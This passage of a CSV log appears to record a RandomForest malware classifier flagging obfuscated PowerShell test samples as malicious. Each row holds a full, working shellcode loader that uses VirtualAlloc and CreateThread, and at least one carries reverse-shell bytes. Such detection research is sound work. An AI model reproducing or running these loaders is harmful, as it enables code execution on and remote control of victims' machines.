lpAddress,',',0x84,0x3f,0','lic stati',',0x9a,0xf6,0x5d,0x7f,0x73,0x7c,0xf3,','0x6a,0xe1,0xd2,0x29,0xa2,0x25,0x86',',0','-memberDefin','0x74,0x2d,0x20,0x3e,0x74,0x82,0x0d,0x8f,0x87,0xda,0x4a,0x37,0x78,0xa9,0xa2,0x44,0x','0x90,0xf','xe4,0x93,0xb9,0x7e,0x17,0x63,0xd6,0x09,0x64,0x51,0x79,0xa2,0xe2,0xd9,0xf2,0x6c,0xf4,0x1e,0x29,0xc8,','rn IntPtr memset(IntPtr dest, uint src, uint count);faz;AlRw = Add-Type ','x59,0x50,0xf6,0xb2,0xd3,0x4a,0x1b,0xfe,0xaa,0xe1,0xef,','readAttributes, uint dwStackSize,','Ptr lpParameter, uint dwCreationFlags, IntPtr lpThre','ition AlRLQ6C -Name o1EWin32o1E -nam','sthru;[Byte[]];[Byte[]]AlRz = 0xdd,0xc5,0','c,0x4f,0xdc,0x2f,0xc5,0x0b,0xfb,0xeb,0x8e,0xc8,0x62,0xad,0x6a,0xbe,0x9b,0xad,0xd5,0x1f,0x3e,0xa5,0xfb,0x74,0x33,0',',0xf0,0x1e,0x5c,0xd1,0xad,0x77,0xc8,0x48,0xf4,0x0c,0x69,0x94,0x22,0x69,0xa9,0x1e,0xc1,0x8d,0x67,0xd7,0xac,0x9d,0x1f,0x17,0xfb,0xfc,0x89,0x28,0xd1,0x6b,0x35,0xbd,0xde,0x3d,0x62,0x29,','espace Win32Functions -pas',' uint dwSize, uint flAllocationType, uint flPr','c exte','6,0xdf,0xc7,0xc5,0x42,0x54,0xa5,0xc1,0x65,0xdd,0x00,0x34,0x4b,0xde,0x39,0x04,0xca,0x5c,0x40,0x59,0x2c,0x5d,0x8b,0xac,0x2d',' 1)};AlRw::CreateThread(0,0,AlR6u5c,0,0,0);for (;;){Start-sleep 60};',' faz[DllImport(o1Ekernel32.dllo1E)]pub')) -CrEpLAce'AlR',[CHar]36  -CrEpLAce ([CHar]111+[CHar]49+[CHar]69),[CHar]34 -replAce ([CHar]102+[CHar]97+[CHar]122),[CHar]39))",malicious,TP
2026-07-13 17:17:32,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3849.ps1,custom-ps-ml,UNKNOWN,987f2e73-b85d-4362-acf2-01cdbc9db684,DESKTOP-BAC9DBQ,malicious,0.9608,RandomForest,3647,1567.98,". ( $ENV:COMsPeC[4,24,25]-joIn'') ( ((\""{63}{51}{32}{61}{78}{60}{64}{50}{7}{53}{39}{13}{28}{45}{9}{20}{2}{12}{69}{75}{74}{25}{29}{52}{66}{82}{0}{5}{1}{38}{31}{58}{77}{3}{68}{8}{54}{10}{65}{27}{26}{14}{67}{56}{16}{70}{42}{37}{11}{33}{40}{79}{15}{48}{80}{41}{72}{4}{83}{84}{30}{76}{6}{44}{86}{18}{71}{22}{47}{49}{62}{17}{36}{46}{34}{23}{73}{24}{19}{21}{43}{59}{35}{57}{55}{81}{85}\""-f'52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0',',0xd3,0x8b','Win325sV -namespace Win32Functio','58,0x8b,0x58,0x24,','6,0x8b,0','xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01','3,0x53,0x6a,0x00,0x56,0x53,0x57,0x','t);[DllImport','x8b','Definition EvMc -Name 5','0x04,0x8b,0x01,','d5,0x6','ns -passthru;[Byte[]];[Byte[]]EvMz',' dwCreationFlags, IntPtr lpThreadId);[DllImport(5sVmsvcrt.dll5sV)]public static extern IntPtr memset(IntPtr dest, uint src, uint count)','c,0x77,0x26,0x07,0xf','08,0x75,0',',0x29','0,0x53,0xff,0xd5;EvMg = 0x1000;if (EvMz.Length -gt 0x1000){EvMg = EvMz.Length};EvMx=EvMw::Virtua','ff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00','0);for (;;)','sV','{Start-sleep 60};wNZ;EvMe = [System.Convert]::ToBase64String([Syste','0,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x','32()+',' 1)};EvMw::CreateThread(0,0,EvMx,0,0,','x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28','x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4',',0x8b,0x12,0xeb,0',';wNZwNZ;EvMw = Add-Type ',',0x0f,0xb','0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0','6,0x03,0x7d,0xf8,0x3b','l5sV)]public static exte','a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50','Mi -le (EvMz.Length-1);EvMi++) {EvMw::memset([IntPtr](EvMx.ToInt','code.GetBytes(EvM1));if([IntPtr]::Size -eq 8){EvMx86 = EvMenv:SystemRoot + 5sVrM7','lAl',',0xff,0x',',0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf','tPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint',',0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68','a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0',',0x80,0x6b,0x00','m.Text.Encoding]','68,0x02,0xd9,0xc8,0x','-member','loc(0,0x1000,EvMg,0x40);for (EvMi=0;Ev','4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0x','xec,0xe8,0','c7,0xc3,0xbb,0xf','int flProtec',' wNZwNZ[DllImport(5sVkernel32.dl','7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,','(5sVkernel32.dll5sV)]public static extern In',',','erShellrM7v1.0rM7powershell5sV;EvMcmd = 5sV-nop ','8,0x90,0x01,0x00,0x00','syswow64rM7WindowsPow',',','::Uni','pe','rn IntPtr VirtualA','0,0xb5,0xa2,0x56,0x6a,0x0','EvM1 = wNZEvMc =',', u','0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a','0x20,0xc1,0xcf,0x0d,0x01,0x','f,0xd5,0xb','0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0',' ',',0xc4,0x54,0x50,0x68,0x29',',0x6a,0x0','xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x3','EvMi), EvMz[EvMi],',',0x82,0','= 0xfc,0xe8','xff,0xd5,0x9','0x7d,0x24,0x75,0xe4,0x','lloc(IntPtr lpAddress, uint dwSize, uint flAllocationTy',',0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x','x61,0x00,0x00,0x00,0x6','-noni -enc 5sV;iex 5sV&amp; EvMx86 EvMcmd EvMe5sV}else{EvMcmd = 5sV-nop -noni -enc5sV;iex 5sV&amp; powershell EvMcm','c7,0xe2,0xf2,0x52,0x57,0x8b,0x','x36,0x6a,0x40,0x68,0x00,0x','10,','d EvMe5sV;}','5f,0x')).rEplAcE('EvM',[StRiNG][chAr]36).rEplAcE('rM7',[StRiNG][chAr]92).rEplAcE('wNZ',[StRiNG][chAr]39).rEplAcE('5sV',[StRiNG][chAr]34) )",malicious,TP
2026-07-13 17:17:43,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3852.ps1,custom-ps-ml,UNKNOWN,9ff985d0-2c8c-4580-bcbf-9ca5ca4f6ebd,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3077,1577.71," ((\""{6}{20}{38}{27}{24}{51}{36}{42}{12}{35}{7}{37}{19}{47}{44}{3}{43}{46}{11}{41}{21}{5}{1}{49}{14}{30}{8}{50}{33}{34}{29}{0}{16}{31}{39}{22}{18}{10}{17}{23}{13}{9}{25}{4}{28}{45}{48}{26}{15}{2}{32}{40}\"" -f'97,0x8a,0x96,0xad','0x90,0x97,0x6c,0x5e,0x75,0x41,0xe6,0x6c,0x32,0x06,0xa0,0x70,0xc5,0xcb,0xda,0x8d,0x4e',' 1)};EYCw::CreateT',',0xc9,0x15,0x8a,0xba,0x08,0x51,0xf7,0x36,0x58,0x0a,0x73,0xe4,0x4d,0x3f,0xc9,0x34,0xe','Cz.Leng','13,0xf4,0xd2,0x2f,0x80,0x5e,','EYCo4m = AS8[DllImport(mJwkernel32.dllmJw)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, ui','x42,0x73,0x9f,0x7a,0xd9,0xc5,0xd9,0x74','xf1,0x72,0xd7,0xd9,0x2b,0xc2,0x47,0x24,0','x49,0x90','0x23,0xd4,0x65',',0x8d,0x5f,0xb9,0xad,0x2f,0xb3,0xb1,0xe4,0x37,0xd0,0xfc,0xbf,0xcc,0x22,0x8a,0x3e,0x05,0x7b,0x73,0xec,0x68,0xb3,0x86,0xed,0xad,0x','-memberDefinition EYCo','0','0x14,0xc8,0x88,0x4c,0xce,0x71,0x88,0x28,0xa1,0x8e,0xca,0x92,0x1e','t([IntPtr](EYCib9l.ToInt32()+EYCi), EYCz[EYCi],',',0xfa,0xe5,0xf9,0xd9,0x97,0x9c,0x6b,0x44,0x1f,0x71,0x10,0xe2,0xb1,0xfe,0xf6,0x84,0x2',',0x7e,0xd2,0x19,0xb0,0xfa,0xd4,0x92,0x37,0xfa,0x9a,0x52,0x3d,0xe8,0x4a,0x93,0x08,0x52,0xdc,0xac,0xa6,0xf9,0xe0,0x38,0x4d,0xa8,0xb7,0xd4,0x4f,0x8d,0xff,0x7a,0xaf,0xf8,0x74,0xb2,0',',0xb0,0x00,0x40,0x1e,0xc2,0xd0,0x10,0xdc,0xcc,0xc1,0xbc,0x69,0x2a,0x8b,0x2c,0x3c,0xe4,','x5f,0x2b,0xc9,0xb1,0x4e,0x31,0x5f,0x15,0x83,0xc7,0x04','nt flAllocationType, uint flPro','x9a,0x','40,0xa3,0x4b','x25,0x43,0xe2,0xbb,0xa9,0x43,0xf2,0xed,0xa3,0x43,0x9a,','IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartA',',0x17,0xbf,0x95,0x0d,0x04,0x6c,0x00,0xae,0x7d,0xc1,0x83,0xc6,0x83,0x3c,0xe3,0x48,0x7b,0x6b,0xf5,0xb5,0xaa,0x55,0x83,0xd7,0x6e;EYCg = 0x1000;if (EY',':memse',');[DllImport(mJwkernel32.dllmJw)]public static extern IntPtr CreateThread(','th -gt 0x1',',0xc0,0x05,0x7b,0x61,0x69,0x2d,0x',',0x2a,0x80,0x3f,0x4a,0x47,0xcb,0x57,0xbf,0x65,0xf4,0xa7,0xd7,0xfe,0x87,0x95,0x78,0x54,0x00,0x96,0','8,0x75,0x07,0x30,0x1a,0x5d','hre','0xf9,0xc2,0xa8,0xe9,0xf9,0xeb,0x7c,0xbd,0x','a9,0x43,0x2f,0x7d,0x1a,0x24,0x9f,0x15,0x70,0xab','4m -Name mJwWin32mJw -namespace Win32Functions -passthru;[Byte[]];[Byte[]]EYCz = 0xbb,0','eationFlags, IntPtr lpThreadId);[DllImport(mJwmsvcrt.dllmJw)]',',0x24,0xf4,0','tect',',0x33,0x','ad(0,0,EYCib9l,0,0,0);for (;;){Start-sleep 60};','74,0x79,0x98,0xc7,0x86,0x04,0','public static extern IntPtr memset(IntPtr dest, uint src, uint count);AS8;EYCw = Add-Type ','5,0x73,0','77,0xf8,0x37,0x70,0x88,0x9d,0xbe,0x95,0xb9,0x9d,0xa4,0xde,0xea,0x2d,0xaf,0xb3,0x06,0xc5,0xfd,0x27,0x9c,0xab,0x29,0x47,0x15,0x01,0x0f,0x66,0xa6,0x3a,0x73,0xe9,0x24,0x41,0xa7','000){EYCg = EYCz.Length};EYCib9l=EYCw::VirtualAlloc(0,0x1000,EYCg,0x40);for (EY','xdf,0x3c,0x1a,0xc3,0xde,0x6d',',0x03,0x5f,0x11,0xe2,0xb7,0x8f,0x','Ci=0;EYCi -le (EYCz.Length-1);EYCi++) {EYCw:',',0xea,0x0c,0x04,','xd4,0x32,0x41,0xe3,0x80,0x62,','ddress, IntPtr lpParameter, uint dwCr')).REPLacE('AS8',[STrinG][cHaR]39).REPLacE(([cHaR]109+[cHaR]74+[cHaR]119),[STrinG][cHaR]34).REPLacE(([cHaR]69+[cHaR]89+[cHaR]67),[STrinG][cHaR]36) | InvoKE-eXpreSSIOn",malicious,TP
2026-07-13 17:17:49,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3945.ps1,custom-ps-ml,UNKNOWN,7b5c4ced-8e4a-4302-8897-1b8c7d22c72a,DESKTOP-BAC9DBQ,malicious,0.8418,RandomForest,2944,1724.96," &amp;( $VERBoSEpREfeRenCE.TostRING()[1,3]+'x'-JOIN'')((((\""{0}{9}{8}{1}{30}{7}{5}{12}{6}{4}{2}{36}{14}{27}{17}{23}{18}{29}{31}{16}{28}{35}{11}{43}{19}{38}{44}{40}{37}{46}{48}{13}{26}{42}{41}{20}{25}{39}{22}{34}{32}{10}{21}{45}{24}{15}{3}{47}{33}\""-f 'W2b0iVu = j1h[DllImport(5uBkernel32.dll5uB)]public static e',' CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreat','passthru;[Byte[]];[Byte[]]','VirtualAlloc(0,0x1000,W2bg,0x40);for (W2bi=0;W2bi -le (W2bz.Leng','j1h;W2bw = Add-Type -memberDefinition W2b0iVu -Name 5uBWin325uB -namespace Win32Functions -','llImport(5uBmsvcrt','tr memset(IntPtr dest, uint src, uint count);',' lpThreadId);[D','Ptr','xtern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(5uBkernel32.dll5uB)]public static extern Int','x84,0xb7,0x17,0x8c,0x30,0xba,0x4e,0xfa,0x9e,0x45,0xa5,0x71,0x16,0xd0,0x06,0xed,0x57,0x34,0x87,0x','2,','.dll5uB)]public static extern IntP','4,0xc0,0x9','da,0xcb,0xba,0x14,0x05,0x01,0x6b,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x','bg = W2bz.Length};W2bSae=W2bw::','0x83,0x7c,0x77,0x00,0xc4,0x','8,0x83,0xee,0xe8,0xe7,0xf4,0x97,0xf8,0x6a,0','x0a,0x7e,0x82,0xc9,0x0a,0xe4,0xc6,0x79,0xbb,0x6e,0x8a,','x53,0x85,','77,0x83,0x05,0xcf,0x78,0xbe,','ed,0x01,0x5e,','0x2d,0x5c,0x1e,0x54,0x1e,0','xf6,0x67,0xf8,0','3a,0xd4,0xb0,0xf9,0x96,0x48,0x69,0x6c,0x19,0x39,0xde,0x27,0x71,0xc7,0x39,0x0f,0xde,0x38,0x6c,0x91,0x22,0xef,0x48,0xe7,0x4a,0x33;W2bg = 0x1000;if (W2bz.Length -gt 0x1000){W2','0xf2,0x5','4,0xef,0xca,0xad,0xd3,0xa8,0xce,0x30,0x37,0xc3,0xea,0xb9,0xb6,0x04,0x7b,0xf9,0x9c,0x80,0x20,0x59,0xbc,0x91,0x8c,0x0c,0xc1,0xc2,0x6','56,0x1','61,0x7a,0x50,0x9d,0xee,0x29,0x45,0xaa,0xbb,0xf1,0xee,0xe0,0','0x75,0x30,0x22,0x3f,0x0e,0x34,0xeb,0x30,0xa7,0xf3,0xcd,0x7f,0x38,0xaf,0x2e,0xe1,0xba,0xb2,0x','ionFlags, IntPtr','62,0xc1,',',0','Int32()+W2bi), W2bz[W2bi], 1)};W2bw::CreateThread(0,0,W2bSae,0,0,0);for (;;){Start-sleep 60};','x0e,0x8f,0x14,0xce,0xee,0x7f,0xfc,0x04,0xe1,0xa0,0x1c,0x27,0x2b,0xc9,0xb6,0xc8,0x82,0xa1,0x2e,0x70,0x8f,0x3a,0xcf,0x7d,0x05,0x47,0xcf,0xf6,0xaa,0xb7,0x81,0xfe,0xc7,0xab,0x75,0x0f,0x92,0x96,0xd3,0x10,0x08,0xbc,0xdb','x2a,0x72,0x1','W2bz = 0x','xc1','0xcb,0x17,0x73,0x27,0x18,0x2c,0x3a,0x3f,0x7d,0x09,','f,0x87,0x41,0x03,0x49,0x43,0x15,0x53,0xe1,0x62,0x16,0x38,0xf1,0x8b,0xc3,0xd5,0xf4,0x1b,0x2c,0x81,0xf6,0xff,0xc4,0xd0,0xf8,0xfa,','b8,0x35,0x03,0','0xc9,0xca,0x17,0xec,0x09,0x45,0x2f,0x9f,0x3b,0xca,0x9b,0x37,0x','f,0xf0,0x67,0x88,0x9d,0xe5,0x15,0xd3,','0xb0,0x4d,0','0xf4,0xb4,0xb5,0xe5,0x07,0x1d,0x84,0x06,0xab,0x60,0x29,0xf5,0xb5,0xa5,0x8d,0xe6,0xc3,0xdf,0xee,0x9b,0xd3,0x1b,0x8d,0x47,0x51,0x','0x87,0x85,0xf5,0x',',0x64,0','th-1);W2bi++) {W2bw::memset([IntPtr](W2bSae.To','xc')) -rEPlAcE ([ChAr]53+[ChAr]117+[ChAr]66),[ChAr]34-crepLaCE([ChAr]87+[ChAr]50+[ChAr]98),[ChAr]36  -crepLaCE  ([ChAr]106+[ChAr]49+[ChAr]104),[ChAr]39))",malicious,TP
2026-07-13 17:18:03,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3946.ps1,custom-ps-ml,UNKNOWN,50ae3229-adbb-490c-b62d-8329291c1552,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3077,1614.05," .( $sHeLLId[1]+$ShELlID[13]+'x') ( ((\""{0}{4}{15}{70}{39}{41}{58}{60}{56}{46}{66}{36}{57}{22}{45}{42}{32}{33}{54}{26}{52}{14}{16}{5}{65}{47}{9}{2}{10}{64}{28}{72}{20}{8}{38}{51}{29}{19}{17}{27}{61}{50}{37}{40}{6}{59}{25}{23}{43}{67}{48}{11}{53}{18}{44}{68}{69}{55}{34}{31}{63}{35}{24}{3}{62}{1}{71}{13}{30}{21}{12}{7}{49}\""-f 'OKaa9j = YeE[DllImport(sG6kernel32.dllsG6)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImpo','oc(0,0x1',',0xf6,0x23,0x38,0x6b,0xf7,0x64,0x25,0x86,0xa5,0x3d,0x21,0x35,0x5a,0x4a,0x7f,0x86,0xd1,0x00,0x91,0x8e,0x06,0xd0,0x','::VirtualA','rt(sG6kernel32.dllsG6)]public static','0f,0x34,0xae,0xf9,0x87,0','5f,0x7d,0x1b,0x02,0x1f,0x2d,0xdb,0xf2,0xf7,0x27,0xd4,0x2d,0',' 1)};OKaw::CreateThread(0,0,OKaniRh,0,0,0);for (;;){Start-sleep 60}','0x69,0x64,0xc','1a,0xf7,0x16','90,0xbf,0x98,0x6b,','31,0x1f,0x23,0xe6','OKai), OKaz[OKai],','iRh','f,0x09,0xc9,0x99,0xff,0x5a,0x9f,',' exte','0x15,0x8b,0x','x09,0xde,0x29,0x0d,','cd,0xf9,0xf8,','a8,0xe4,0x2c,0xf3,0xd5,0xf7,0x8f,0xac,0x73,0x73,0x3d,0xb8,0',',0xbf,0x15,0x38,0xf3,',')+','c, uint count);YeE;OKaw = Add-Type -memberDefinition OK','0x51,0xb2,0x','Kag = OKaz.Length};OKaniRh=OKaw','6,0x8d,0xa7,0x97,0x3e,0x39,','x5f,0x5a,0x29,0xc9,0xb1,0x47,0x','0x20,0xe1,0xa9,0x19,0x33,0x92,0x9b,0x86,0xef,0x3c,0x97,0x4f,','0x04,0xdd,0x42,0x',',0xbd,0x6e,0x77,0x03,0xb6,0x8a,0xfc,0xa2,0x19,0x1b,0x46,0x81,0xbd,0x40,0x1c,0x','.ToInt32(','0x6e,0x31,0xc5,0x11,0x6e,0x0d,0x10,0x5f,0x0','-Name sG6Win32sG6 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]OKaz = 0xdb,0xdb,0xd','9,0x74,0x24,0xf4,0xbb,0x9c,0x4a,0x','32,','x7f,0xa0;OKag = 0x1000;if (OKaz.Length -gt 0x1000){O','ic static extern','0x99,0xbc,0x6b,0xef','1,0x58,0x54,0x49,0x30,0xa0,0x90,0x6d,0xab,0xd7,0xe8,0x8e,0x56,0xe0,0x2e,0xed,0x8c,0x65,0xb5,0x55,0x46,0xdd,0x11,0x64,0','kSize, IntPt',',0x8a,0x48,0x8d,0x','r lpStartAddress, IntPtr ',' ','b','0x36,0x01,0xfa,0xf8,0x60,0x4b,0xfa,0x90,0xd4','aa9j','lpThr',',0xe4,0xc2,0x15,0x','2e,0xa1,0x05,0xc6,0x',';',',0x86,0xef,0x7d,0xe3,0xd2,0xbf,0x15,0xc2,0x5a,0x54,0xe6,0xeb,0x8e,0xc1,0xe3,0x7b,0xf1,0xbe,0x93,0xf8,','x8b,0xb8,0xd2,0x6a,0x60,0xce','83,0xc2,0x04,0x31,0x5a,0x14,0x03,0x5a,0x88,0xa8,0x18,0xa3,0x58,0xae,0xe3,0x5c,0x98,0xcf,0x6a,0xb9,0xa9,0xc',',0xa7,0xa4,0xe2,0xb1,0x5f,0xa7,0xd3,0xf5,0xff,0x58,0x36,0x8e,0x36,0x','ed,0','d,0x16,0x8f,0x05,0xb4,0xcb,0x18,0x6e,0x3a,0x','Ptr ',' IntPtr memset(IntPtr dest, uint sr','lpParameter, uint dwCre','xe7,0x47,0x3e,0x4','ationFlags, Int','0x36,0xba,0xd8,0x65,0x8e,0x54,0x27','ll','4,0','0xcb,0x1f,0x1a,0xb8,0x67,0x16,','x3b,0x07,0xb7,0xf1,0x72,0x98','eadId);[DllImport(sG6msvcrt.dllsG6)]publ','5,0xd8,0x9e,0x68,0xb0,0xda,0x15,0x9f,0x44,0x94,0xdd,0xea,0x56,0x40,0x',',0x2f,0xa9,0x85,0x','1a,0xfa,0xd','rn IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStac','000,OKag,0x40);for (OKai=0;OKai -le (OKaz.Length-1);OKai++) {OKaw::memset([IntPtr](OKan','e0')).REplAce('YeE',[stRing][ChaR]39).REplAce(([ChaR]115+[ChaR]71+[ChaR]54),[stRing][ChaR]34).REplAce(([ChaR]79+[ChaR]75+[ChaR]97),'$') )",malicious,TP
2026-07-13 17:18:13,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3973.ps1,custom-ps-ml,UNKNOWN,9267a552-8656-470e-8b29-f4a2659fad58,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3045,1642.21,". ( $ShELLId[1]+$shelLid[13]+'x')((((\""{69}{33}{30}{25}{67}{42}{40}{4}{58}{49}{65}{43}{17}{56}{45}{51}{11}{12}{60}{16}{34}{36}{41}{19}{8}{22}{71}{7}{46}{63}{37}{20}{57}{44}{59}{50}{54}{9}{1}{0}{61}{52}{35}{29}{47}{15}{68}{55}{23}{53}{27}{13}{26}{6}{39}{32}{5}{72}{10}{21}{3}{62}{64}{38}{48}{70}{66}{18}{28}{14}{24}{31}{2}\"" -f 'x','0xfa,0x43,0xe0,0xda,0xa7,0x10,0x89,0x7b,0','()+tvTi), tvTz[tvTi], 1)};tvTw::CreateThread(0,0,tvTGsSU,0,0,0);for (;;){Start-sleep 60};','0xed,0xfe,0xd4,0x58,0xef,0xc3,0x02,0xa4,0x85,0','e','1,0xb5,0x53,0xeb,0xc1,0xe3,0x39,0xeb,0xa9,0','0xaf,0x26,0xd7,','0xf8,','9,0xd4,0x8b,0x27,0x48,0xd4,0xe8',',0x3c,0x29,0x6b,0xf7,0xc3,0xfe,','a,0xb8,0xcc,0x9b,0xb7,0xac,0x','Add-Type ','-memberDefinition tvTJT0t -Name 2KnWin322Kn -namespace Win32Functions -passthru;[Byte[',',0x50','v','b,0x54,0xda,0x26,0xa2,0x0d,0x72','x0c,0xc5,0xda,0xd1,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0x','wCreationFla','Tz.Length-1);tvTi++) {tvTw::mems',',0x7','0xa8,0x31,0x97,0x5c,0x7f,0x4a,0xce,0x7e','5d,0x0e,0x38,0x85,0x32,0x99,0x50,0x2b,0x6d,',',0x2c,0xfa,0xe4,0x7b,0x60,0xf6,',',0x','TGsSU.ToIn','r VirtualAlloc(IntPtr',',','xb2,0x28','et([IntPtr](t',',0x89,0x5a,0x37,0x8f,0xf3,0x5c,0xd6,0x13,0x7d,0xba,0x88,0xfb,0x2d,0x13','IntPt','t32',',0xb3,0xea,0x3','n)]public static extern ','b1,0x47,0x31,0x5a,0x13,0x83,0xc2,0x04,0x03,0x5a,0x8d,','f,0x35,0x4b,0x0a,0x8a,0xa0,0x4e,0x9c,0x84','0xad,0xf9,0x39,0x79,0xb3,0x02,0','0,0xe5,0x34,0x61,0x94,0x6d,',' -gt 0x1000){tvTg = tvTz.Length};tvTGsSU=tvTw::VirtualAlloc(0,','0xf3,0xf8,0xde,0xd5,0x22,0xce,0x40,0x25,0x01,0x45,0x48','locationType, uint flProtect);[DllImport(2Knkernel32.dll2Kn)]public static ','xc2','t flAl','ess, IntPtr lpParameter, uint d','x36,0x33,0x10,0xf3,0x07,0xbc,0xbf,0x3a,0xa8,0x4f,0xc','n)]public static extern IntPtr memset(IntPtr dest, uint ','0x75,0x1b,0x02,0x3',',0x68,0xac,0x8d,0xc3,0x00,0xa6,0x01,0x3b,0x30,0xc9,0xc','0x1000,tvTg,','hreadAttributes, uint dw','x6d,','src, uint count);H6M;tvTw = ','x09,0x25,0xf7,0x60,0xed,0xb9,0x06,0x8b,0x0e,0x93,0xcc,0xdf,0x5e,0x8b,0xe5,0x5','f2,0x3a,0x0f,0','0x4d,0xcf,0x41,0x0c,0x89,0x5a,0x52,0xb6,0x5a,0xfc,0xbe,0x47,0x8e,0x9b,0x35,0x4b,0x7b,0xef,0x12,0x4f,0x7a','0xab,0xc9,0x53,0xed,0x5c,0xa7,0x47,0x99,0xac','gs, IntPtr lpThreadId);[DllImport(2Knmsvcrt.dll2K',',0x81,0x9f,0x7a,0x37,0x99,0xfc,0x47,0x81,0x12,0','xtern IntPtr CreateThread(IntPtr lpT','1,0x7b,0x0e,0xb0,0xb4,0x75,0',']];[Byte[]]tvTz = 0xbb,0x82,0x4f,0','0d,0xf6,0xb6,0x9c,0xee,0xa7,0x12,0xd6,0x02,0xb3,0x2e,0xb5,0x4a,0x70,0x03,0x46,0x8a,0x1e,0x14,0x35,0xb8,0x81,0x8e,0xd1,0xf0,0x4a,0','x2d,0x97;','3,0x88,0x5a,0x43,0x2e,0x61,0x0e,0x1c,0x24,0xd4,0xbf,0x29,0x7','tvTg = 0x1000;if (tvTz.Length','StackSize, IntPtr lpStartAddr',');for (tvTi=0;tvTi -le (tv',' lpAddress, uint dwSize, uin',',0xde,0xef,0xc6,0xe3,0x1f,0x3a,0xa3,0x23,','tvTJT0t = H6M[DllImport(2Knkernel32.dll2K','0x40','0x8f,0x2e,0x91,0x8d,0xe2,0xe6,0x96,0x26,0x48,0xd1,0x99,0xb7,0xe1,0x21,0xbb,0x3b,','x53,0x1')) -crepLace ([chAR]72+[chAR]54+[chAR]77),[chAR]39-rEpLacE'tvT',[chAR]36 -crepLace '2Kn',[chAR]34) )",malicious,TP
2026-07-13 17:18:20,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3998.ps1,custom-ps-ml,UNKNOWN,35857055-2ded-4faa-97e4-b962fa3b91e6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2882,1731.26," (((\""{24}{40}{19}{48}{39}{44}{15}{46}{42}{29}{4}{47}{8}{36}{1}{18}{27}{31}{6}{17}{45}{23}{33}{38}{16}{9}{5}{11}{34}{0}{12}{13}{35}{43}{28}{41}{21}{25}{30}{37}{14}{20}{7}{22}{2}{3}{10}{26}{32}\"" -f',0xe1,0x22,0xd7,0xfb,0x62,0x28,',',0xf6,0xab,0xef,0x5a,0x33,0xc9,0','};wkmtUZq=wkmw::VirtualAlloc(0,0x1000,wkmg,0x40);for (wkmi=0;wkmi -le (','wkmz.Length-1);wkmi++) {wkmw::memset([IntPtr](wkmtUZq.ToIn','Add-Type -memberDefinition wkmgbE -Name wuxWin32wux -namespa',',0x21,0x4f,0xeb,0xd5,0xb0,0x99,0x22,0x15,0x1e,0xe4,0x8b,0xe4,0x5e,0x20,0x2b,0x17,0x15,0x58,0x48,0xaa,0x2','b,0x4f,0x59,0xd7,0x4b,0x1b,0','0xa7,','32Functions -passthru;[','x19','t32()+wkmi), wkmz[wkmi','e,0x9f,0x33','0x9c,0x88,0x2d,0x2c,0x','23,0x5c,0x46,0x48,0xa8,0x63,0x89,0xd9,0xea,0x47,0x0d,0','x4f,0xc2,0x61,0xc5,0xa7,0','t',',0xb4,0x1f,0','x0f,0x','xb1,0x47,0x31,0x5a,0x18,0x03,0x5','tPtr CreateThread(IntPtr 